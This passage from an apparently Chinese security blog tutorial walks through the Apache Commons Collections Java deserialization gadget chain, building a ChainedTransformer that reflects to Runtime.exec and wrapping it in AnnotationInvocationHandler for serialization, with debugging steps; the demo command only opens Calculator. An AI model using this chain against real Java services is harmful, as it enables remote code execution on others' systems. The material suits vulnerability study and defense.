<p>通过**<code>decorate</code>函数**就可以将一个普通的<code>Map</code>转换为一个<code>TransformedMap</code>。<strong>第二个参数和第三个参数分别对应当<code>key</code>改变和<code>value</code>改变时对应transform函数需要做的操作</strong>；</p>
<blockquote>
<p>举个例子：</p>
</blockquote>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.Transformer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.commons.collections.map.TransformedMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.HashMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.Map;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map&lt;String, String&gt; hashMap = new HashMap&lt;String, String&gt;();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        hashMap.put(&quot;1&quot;, &quot;2&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // key修改执行Test中的transform方法，value修改执行Test1中的transform方法</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map transformedMap = TransformedMap.decorate(hashMap, new Test(), new Test1());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 两个值都修改就会Test和Test1中的transform都执行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        transformedMap.put(&quot;3&quot;, &quot;4&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;\n--- 分界线 ---\n&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map.Entry transformedMapValue = (Map.Entry) transformedMap.entrySet().iterator().next();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 值改变会执行 Test1类 中的transform方法</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        transformedMapValue.setValue(&quot;5&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class Test implements Transformer {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public Object transform(Object o) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;Test Object: &quot; + o.toString());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return &quot;Test Object&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class Test1 implements Transformer {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public Object transform(Object o) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;Test1 Object: &quot; + o.toString());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return &quot;Test1 Object&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20210804110655561" src="/assets/images/image-20210804110655561-4eb4827c789f7a9be3321b89851fd0c3.png" width="1802" height="1748" class="img_ev3q"></p>
<p>即**<code>Transformer实现类（如ChainedTransformer）</code>**分别绑定到<code>Map</code>的key和value上，<strong>当map的key或value被修改时，会调用对应<code>Transformer</code>实现类的<code>transform()</code>方法</strong>去进行一些变换操作。</p>
<hr>
<p><strong>为什么会这样？为什么put了就会触发transform方法？</strong></p>
<p>看一下<code>TransformedMap.put</code>这个方法，发现在<code>put</code>操作的时候，会直接调用类函数中的<code>transformKey</code>和<code>transformValue</code>去处理</p>
<p><img decoding="async" loading="lazy" alt="image-20210805144549483" src="/assets/images/image-20210805144549483-942c1a0b721696742634b94a10c765a3.png" width="1822" height="1156" class="img_ev3q"></p>
<p>然后这俩个类函数返回的是我们传入的<code>Transformer实现类</code>去执行<code>transform</code>方法</p>
<p><img decoding="async" loading="lazy" alt="image-20210805145501209" src="/assets/images/image-20210805145501209-89595f9d8bbd33fb84e3f57e9c3efba8.png" width="1784" height="878" class="img_ev3q"></p>
<p>所以我们<code>put</code>了过后就触发了。</p>
<p>调用<code>setValue</code>触发同理；<code>TransformedMap</code>里的每个<code>entryset</code>在调用<code>setValue</code>方法时会自动调用<code>TransformedMap</code>类的<code>checkSetValue</code>方法</p>
<p><img decoding="async" loading="lazy" alt="image-20210805150544955" src="/assets/images/image-20210805150544955-5194a9437c104016b033088c652102fb.png" width="874" height="158" class="img_ev3q"></p>
<hr>
<p>我们可以把<code>chainedtransformer</code>绑定到一个<code>TransformedMap</code>上，当此map的key或value发生改变时，就会自动触发<code>chainedtransformer</code>。</p>
<p><img decoding="async" loading="lazy" alt="image-20210802140726643" src="/assets/images/image-20210802140726643-b90822a21d1d241054dacd356f0333dc.png" width="2000" height="1298" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="mapentry">Map.Entry<a href="#mapentry" class="hash-link" aria-label="Map.Entry的直接链接" title="Map.Entry的直接链接">​</a></h4>
<p><code>Map.Entry</code>是Map的一个内部接口。</p>
<p>Map.Entry是Map声明的一个内部接口，此接口为泛型，定义为<code>Entry&lt;K,V&gt;</code>。它表示Map中的<code>一个实体（一个key-value对）</code>。接口中有<code>getKey()</code>、<code>getValue()</code>方法。</p>
<p><img decoding="async" loading="lazy" alt="image-20210802142633195" src="/assets/images/image-20210802142633195-9c9fa1f2a12b10568168434684166d67.png" width="2070" height="890" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="反射exec">反射exec<a href="#反射exec" class="hash-link" aria-label="反射exec的直接链接" title="反射exec的直接链接">​</a></h3>
<p>在Java中执行命令一般通过<code>Runtime.getRuntime().exec(&quot;command&quot;)</code>来执行命令，如果我们想在修改<code>transformedMap</code>时执行命令，就需要构造一个特殊的<code>ChainedTransformer</code>来反射出exec函数。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="反射利用链">反射利用链<a href="#反射利用链" class="hash-link" aria-label="反射利用链的直接链接" title="反射利用链的直接链接">​</a></h4>
<p>分析<code>ChainedTransformer</code>中的<code>transform</code>方法可以发现，这个链中，会将上一次变换的结果作为下一次变换的输入，直到所有的变换完成，并返回最终的<code>object</code></p>
<p><img decoding="async" loading="lazy" alt="image-20210802210659501" src="/assets/images/image-20210802210659501-c58890adae98c4f2badb71009ff208ea.png" width="1226" height="304" class="img_ev3q"></p>
<p>再分析<code>InvokerTransformer</code>中的<code>transform</code>方法可以发现，这地方就是通过给定的<code>object</code>，然后通过<code>.getClass</code>、<code>.getMethod</code>、<code>.invoke</code>的方法进行反射，达到调用指定方法的目的。</p>
<p><img decoding="async" loading="lazy" alt="image-20210802210838375" src="/assets/images/image-20210802210838375-1109f13d4c392c21dc6ea2e5bf244b41.png" width="2720" height="720" class="img_ev3q"></p>
<hr>
<p>所以我们构造的<code>ChainedTransformer</code>的链中，最终的执行应该是类似于：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;).invoke(Runtime.class)).exec(&quot;open -na Calculator&quot;);</span><br></span></code></pre></div></div>
<hr>
<p>因此链的<em><strong>第一步</strong></em>，就是获取<code>Runtime</code>的类，可以通过内置的<code>ConstantTransformer</code>来获取</p>
<p><img decoding="async" loading="lazy" alt="image-20210802211645383" src="/assets/images/image-20210802211645383-058102998ab93c41003d7bf68ec6eeb9.png" width="1102" height="316" class="img_ev3q"></p>
<p>这时链就变成了</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Transformer[] transformers = new Transformer[]{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new ConstantTransformer(Runtime.class)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Transformer transformerChain = new ChainedTransformer(transformers);</span><br></span></code></pre></div></div>
<hr>
<p><em><strong>第二步</strong></em>就是通过<code>InvokerTransformer</code>来反射调用<code>getMethod</code>方法，参数是<code>getRuntime</code>，以此来获取到<code>Runtime.class.getMethod(&quot;getRuntime&quot;)</code>，上面也提过，<code>InvokerTransformer</code>共接受3个参数</p>
<p><img decoding="async" loading="lazy" alt="image-20210802214334346" src="/assets/images/image-20210802214334346-5aa20b894f9c424930e5b876c687a125.png" width="1564" height="226" class="img_ev3q"></p>
<ul>
<li>第⼀个参数是待执⾏的⽅法名，此处则为<code>getMethod</code></li>
<li>第⼆个参数是这个函数的参数列表的参数类型，查看<code>getMethod</code>方法的定义，第一个参数是字符串<code>String</code>，第二个参数是<code>Class&lt;?&gt;</code>，代表第二个参数是可变类参数，所以这里是<code>Class[].class</code>，所以此处应写为<code>new Class[] {String.class, Class[].class}</code>
<ul>
<li><img decoding="async" loading="lazy" alt="image-20210802213116414" src="/assets/images/image-20210802213116414-26f5a00e351e51080a932acadd3b7b04.png" width="1998" height="478" class="img_ev3q"></li>
</ul>
</li>
<li>第三个参数是传给这个函数的参数列表，为调用<code>getMethod</code>时候实际传入的参数（需要和第二步里面统一），即为<code>new Object[]{&quot;getRuntime&quot;, new Class[0]}</code>（<code>new Class[0]</code>可以理解为占位符，如果给这个函数传入null的话，会直接抛出空指针异常；如果传入<code>new Class[0]</code>的话就不会抛异常。）</li>
</ul>
<p>因此此时的链就变成了</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        Transformer[] transformers = new Transformer[]{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new ConstantTransformer(Runtime.class),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]})</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br></span></code></pre></div></div>
<hr>
<p><em><strong>然后</strong></em>用同样的方法构造出<code>.invoke(Runtime.class))</code>和<code>.exec(&quot;open -na Calculator&quot;)</code>即可</p>
<p>再举一个构造<code>InvokerTransformer</code>的例子，<code>.invoke(Runtime.class))</code>吧</p>
<ul>
<li>第一个参数方法名：<code>invoke</code></li>
<li>第二个参数参数列表的参数类型：<code>new Class[]{Object.class, Object[].class}</code>
<ul>
<li><img decoding="async" loading="lazy" alt="image-20210802214446148" src="/assets/images/image-20210802214446148-872b1a360db3b07a1199fa4ed5a20b6b.png" width="1378" height="730" class="img_ev3q"></li>
</ul>
</li>
<li>第三个参数就是传入的参数列表，此处是<code>Runtime.class</code>，写成：<code>new Object[]{Runtime.class, new Object[0]}</code></li>
</ul>
<p>最终的链</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        Transformer[] transformers = new Transformer[]{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new ConstantTransformer(Runtime.class),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, new Object[0]}),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -na Calculator&quot;})</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br></span></code></pre></div></div>
<p>链构造好了，只需要构造一个使用这个链的<code>TransformedMap</code>的对象，然后修改里面的内容即可触发命令执行了。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        Map innerMap = new HashMap();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        innerMap.put(&quot;1&quot;, &quot;2&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		outerMap.put(&quot;3&quot;, &quot;4&quot;);</span><br></span></code></pre></div></div>
<p>效果</p>
<p><img decoding="async" loading="lazy" alt="image-20210803110903614" src="/assets/images/image-20210803110903614-117151a506062da2b2f6aeec63448ae9.png" width="2608" height="1594" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="简化链">简化链<a href="#简化链" class="hash-link" aria-label="简化链的直接链接" title="简化链的直接链接">​</a></h4>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        Transformer[] transformers = new Transformer[]{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new ConstantTransformer(Runtime.getRuntime()),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -na Calculator&quot;})</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        };</span><br></span></code></pre></div></div>
<blockquote>
<p>上⾯的命令执⾏只是一个demo，它只是⼀个⽤来在本地测试的类，是不能直接在目标上执行的。</p>
<p>在实际过程中，是需要结合反序列化漏洞，将上⾯最终⽣成的outerMap对象变成⼀个序列化流让目标进行反序列化，达到远程命令执行的目的。</p>
</blockquote>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="使用annotationinvocationhandler触发反序列化">使用AnnotationInvocationHandler触发反序列化<a href="#使用annotationinvocationhandler触发反序列化" class="hash-link" aria-label="使用AnnotationInvocationHandler触发反序列化的直接链接" title="使用AnnotationInvocationHandler触发反序列化的直接链接">​</a></h3>
<p>环境要求：JDK 1.7 <a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html" target="_blank" rel="noopener noreferrer">下载地址，建议选JDK 7u21</a></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="分析">分析<a href="#分析" class="hash-link" aria-label="分析的直接链接" title="分析的直接链接">​</a></h4>
<p>到目前为止，我们已经构造出了可以执行命令的恶意链。</p>
<blockquote>
<p>到这一步，正常的代码审计过程中，会采取两种策略，一种是继续向上回溯，找<code>transformKey</code>、<code>transformValue</code>、<code>checkSetValue</code>这几个方法被调用的位置，另一种策略就是全局搜索<code>readObject()</code>方法，看看有没有哪个类直接就调用了这三个方法中的一个或者<code>readObject</code>中有可疑的操作，最后能够间接触发这几个方法。审计中，一般都会把两种策略都试一遍。</p>
</blockquote>
<p>现在只要找到一个符合以下条件的类，并且服务端有反序列化的入口，就可以RCE了。</p>
<ol>
<li>
<p>该可序列化的类重写了<code>readObject</code>方法；</p>
</li>
<li>
<p>该类在<code>readObject</code>方法中对<code>Map类型</code>的变量进行了键值修改操作，并且这个<code>Map参数</code>是可控的；</p>
</li>
</ol>
<p>根据上面的条件，大佬们找到了<code>rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class</code>这个类；</p>
<p>这个类有一个成员变量 <code>memberValues</code>是<code>Map&lt;String, Object&gt;</code>类型，并且在重写的 <code>readObject()</code> 方法中有 <code>memberValue.setValue()</code> 修改Value的操作。</p>
<blockquote>
<p>注意这个必须要JDK7，JDK8是没有这个问题的</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="image-20210803124949912" src="/assets/images/image-20210803124949912-d061ef91db588d43690f53dd2aeb021e.png" width="2766" height="2150" class="img_ev3q"></p>
<p>根据刚才的<a href="#%E5%8F%8D%E5%B0%84exec">反射exec</a>章节</p>
<p>核心的逻辑就是：</p>
<p>实例化一个<code>AnnotationInvocationHandler</code>类，将其成员变量<code>memberValues</code>赋值为精心构造的恶意<code>TransformedMap</code>对象。然后将其序列化，提交给未做安全检查的Java应用。Java应用在进行反序列化操作时，执行了<code>readObject()</code>函数，修改了Map的Value，则会触发<code>TransformedMap</code>的变换函数<code>transform()</code>，再通过反射链调用了<code>Runtime.getRuntime.exec(&quot;XXX&quot;)</code> 命令，最终就可以执行我们的任意代码了。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="poc构建过程">POC构建过程<a href="#poc构建过程" class="hash-link" aria-label="POC构建过程的直接链接" title="POC构建过程的直接链接">​</a></h4>
<p>通过反射调用<code>AnnotationInvocationHandler</code>的构造函数，给构造的恶意链传进构造参数中，生成对象o；</p>
<blockquote>
<p>AnnotationInvocationHandler 构造函数</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="image-20210803145324415" src="/assets/images/image-20210803145324415-ab4cca1b0ffb9eb939229917bd111a05.png" width="1600" height="452" class="img_ev3q"></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">constructor.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Object o = constructor.newInstance(Retention.class, outerMap);	// 暂时用Retention.class，后面会分析为啥</span><br></span></code></pre></div></div>
<p>对对象o进行序列化</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objectOutputStream.writeObject(o);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objectOutputStream.close();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray()));</span><br></span></code></pre></div></div>
<p>但是在<code>writeObject</code>的时候报了一个反序列化的错误：</p>
<p><img decoding="async" loading="lazy" alt="image-20210803131116934" src="/assets/images/image-20210803131116934-7fb6fb6f485924518897e86d90f06871.png" width="2032" height="1218" class="img_ev3q"></p>
<p>主要原因是因为<code>Runtime类</code>是没有实现 <code>java.io.Serializable</code> 接⼝的，所以是不允许被序列化。</p>
<p>但是我们可以通过反射来获取到当前上下⽂中的<code>Runtime对象</code>，⽽不需要直接使⽤这个类（也就是我们最开始的<a href="#poc%E7%A4%BA%E4%BE%8B">POC示例</a>中的<code>Transformer[]</code>）：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Transformer[] transformers = new Transformer[]{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        new ConstantTransformer(Runtime.class),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -na Calculator&quot;})</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">};</span><br></span></code></pre></div></div>
<p>可以看到成功序列化了，但是反序列化后并没有触发计算器，也就是说并没有成功执行命令。</p>
<p><img decoding="async" loading="lazy" alt="image-20210803132330455" src="/assets/images/image-20210803132330455-019eef951818868b9fdab6d388301df0.png" width="3578" height="1628" class="img_ev3q"></p>
<p>解决思路：触发需要满足以下两个条件：</p>
<ol>
<li>
<p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>构造函数的第⼀个参数必须是 <code>Annotation</code>的⼦类，且其中<strong>必须含有⾄少⼀个⽅法</strong>，假设⽅法名是X；</p>
</li>
<li>
<p>被<code>TransformedMap.decorate</code>修饰的Map中必须有⼀个键名为X的元素。</p>
</li>
</ol>
<p>不懂为什么必须要这样，调试分析一下。</p>
<p>查看<code>readObject</code>代码，发现在<code>setValue</code>前有两个if语句</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">if (var7 != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Object var8 = var5.getValue();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre></div></div>
<p>先在 <code>if (var7 != null)</code>这下断点，然后调试，发现 var7 确实是 null，所以没有执行命令成功</p>
<p><img decoding="async" loading="lazy" alt="image-20210803135155322" src="/assets/images/image-20210803135155322-a109c6cb34e783c1caa49c16e32aab95.png" width="3558" height="858" class="img_ev3q"></p>
<p>分析一下，<code>var7</code>值是从<code>var3.get(var6)</code>获取来的</p>
<p><code>var3</code>是一个<code>map&lt;String, Object&gt;</code>，键是我们构造<code>AnnotationInvocationHandler</code>对象传入的第一个对象（<code>Retention.class</code>）中的方法名（这里是<code>value</code>），而值就是这个方法return的类（这里是<code>class java.lang.annotation.RetentionPolicy</code>）。</p>
<p><img decoding="async" loading="lazy" alt="image-20210803142637777" src="/assets/images/image-20210803142637777-e355f92719d1a3ded75a5479909f358c.png" width="1186" height="956" class="img_ev3q"></p>
<p><code>var6</code>则是我们创建<code>innerMap</code>时put的键值对中的键</p>
<p>放个图大概说明下：</p>
<p><img decoding="async" loading="lazy" alt="image-20210803142038464" src="/assets/images/image-20210803142038464-7cf7b8455994b34308903f32078bb96c.png" width="3582" height="1314" class="img_ev3q"></p>
<p>所以只需要我们创建的<code>innerMap</code>中的键包含在<code>var3</code>的键中即可，也就是说<code>innerMap</code>中的键必须是<code>AnnotationInvocationHandler</code>构造函数的第一个参数（这里是<code>Retention.class</code>）对应类中的方法名<code>value</code></p>
<p>构造<code>innerMap</code>像下图这样</p>
<p><img decoding="async" loading="lazy" alt="image-20210803144238554" src="/assets/images/image-20210803144238554-87fb681d8efad651d6641ab22f28bbe9.png" width="1516" height="244" class="img_ev3q"></p>
<p>再调一下，这个时候的var7满足不等于null了</p>
<p><img decoding="async" loading="lazy" alt="image-20210803144823910" src="/assets/images/image-20210803144823910-7d2b0035dd9efb873a05ef44947587a6.png" width="2858" height="634" class="img_ev3q"></p>
<p>然后看第二个if语句</p>
<p><img decoding="async" loading="lazy" alt="image-20210803145006100" src="/assets/images/image-20210803145006100-1e2bfa92c8addbd995ac0d05399b2a26.png" width="3192" height="572" class="img_ev3q"></p>
<p>需要满足条件：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">var7.isInstance(var8) ==&gt; false	// 满足第一个if条件后，var7就是innerMap中输入的键值对应Annotation子类方法返回的类型，也就是var3对应键的值</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">var8 instanceof ExceptionProxy ==&gt; false // var8就是我们创建的innerMap中输入的键值对中的值</span><br></span></code></pre></div></div>
<p>这个就比较简单，满足条件即可。</p>
<hr>
<p>到这就比较清楚反序列化后面2个if语句的限制了，我们也可以用其他的<code>Annotation</code>的子类即可，举个例子：</p>
<p>随便找个<code>Annotation</code>子类</p>
<p><img decoding="async" loading="lazy" alt="image-20210803145522692" src="/assets/images/image-20210803145522692-23f4c09ef025c4e515c0aba984bc62bb.png" width="1120" height="404" class="img_ev3q"></p>
<p>构建对象</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// 构建对象</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">constructor.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Object o = constructor.newInstance(Action.class, outerMap);</span><br></span></code></pre></div></div>
<p>查看<code>Action.class</code>的源码</p>
